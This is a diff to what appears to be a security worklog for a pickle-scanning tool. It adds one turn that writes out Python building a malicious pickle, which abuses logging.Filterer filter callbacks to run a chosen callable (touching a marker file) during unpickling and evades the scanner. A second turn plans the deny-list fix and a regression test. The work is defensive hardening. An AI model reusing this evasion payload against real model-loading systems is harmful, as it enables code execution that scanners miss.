@@ -3399,3 +3399,114 @@ Blocking plan:
 
 Performance note: one tuple in the sorted static table, no rich-comparison
 modeling.
+
+## Turn 73 - `logging.Filterer.filter` callback pipeline gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using the stdlib logging
+filter pipeline to invoke an attacker-selected callable during deserialization.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_logging_filterer_filter_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("logging", "Filterer"),
+        b")R\x940",
+        sg("logging", "Filterer.addFilter"),
+        b"(",
+        b"h\x00",
+        sg("pathlib", "Path.touch"),
+        b"tR0",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        *(s(part) for part in marker.parts),
+        b"tR",
+        b"\x940",
+        sg("logging", "Filterer.filter"),
+        b"(",
+        b"h\x00",
+        b"h\x01",
+        b"tR.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=188`, `bytes_total=188`, `opcode_count=39`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `logging.Filterer`,
+  `logging.Filterer.addFilter`, `pathlib.Path.touch`, `pathlib.PosixPath`, and
+  `logging.Filterer.filter`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final `Filterer.filter` call
+  returns a `logging.Filterer` containing the `Path.touch` filter and does not
+  create `/tmp/ma_logging_filterer_filter_marker`
+- Unpickle result: the full payload creates
+  `/tmp/ma_logging_filterer_filter_marker` and returns `False`
+- RCE mechanism: `logging.Filterer.addFilter(filter_callable)` stores an
+  attacker-selected callable. `logging.Filterer.filter(record)` then iterates
+  those filters and calls each callable as `filter_callable(record)`. The
+  payload registers `pathlib.Path.touch`, constructs the marker path as the
+  synthetic log record, and calls `Filterer.filter(filterer, marker)`, causing
+  `Path.touch(marker)` before `pickle.loads()` returns.
+
+Why the scanner missed it:
+
+- `logging` is not a wildcard-dangerous module; only `logging.config`
+  functions are currently listed.
+- `logging.Filterer.filter` and `logging.Filterer.addFilter` are absent from
+  `DANGEROUS_GLOBALS`.
+- The payload uses only currently clean globals: `logging.Filterer`,
+  `logging.Filterer.addFilter`, `pathlib.Path.touch`, `pathlib.PosixPath`, and
+  `logging.Filterer.filter`.
+- The dangerous callback is hidden in mutable logging filter state. The final
+  called global is a logging helper that appears benign unless the scanner
+  models the `Filterer.filters` callback list.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is a precise callback-invocation sink. The focused next
+block should add a sorted `DANGEROUS_GLOBALS` entry for
+`("logging", "Filterer.filter")`, with an oracle regression proving that
+filter registration alone does not execute but the filter pass does. Blocking
+all of `logging` or all filter registration is unnecessary for this proof, so
+the hot path can remain a static binary-search policy lookup.
+
+## Turn 74 - Block `logging.Filterer.filter` callback pipelines
+
+Blocking plan:
+
+- Add `("logging", "Filterer.filter")` to the sorted Rust
+  `DANGEROUS_GLOBALS` table. The method iterates stored filters and invokes
+  attacker-controlled callables.
+- Leave `logging.Filterer` and `logging.Filterer.addFilter` allowed for this
+  focused block. They construct mutable filter state, but the side effect in
+  the proof occurs when `Filterer.filter` runs the callback pipeline.
+- Add a CPython oracle regression that builds the manual
+  `Filterer.addFilter(Path.touch)` payload, verifies the registration-only
+  control remains clean and does not create the marker, then verifies
+  scan-time detection on the RCE variant before proving the filter pass creates
+  the marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: one tuple in the sorted static table, no logging-state or
+filter-list modeling.
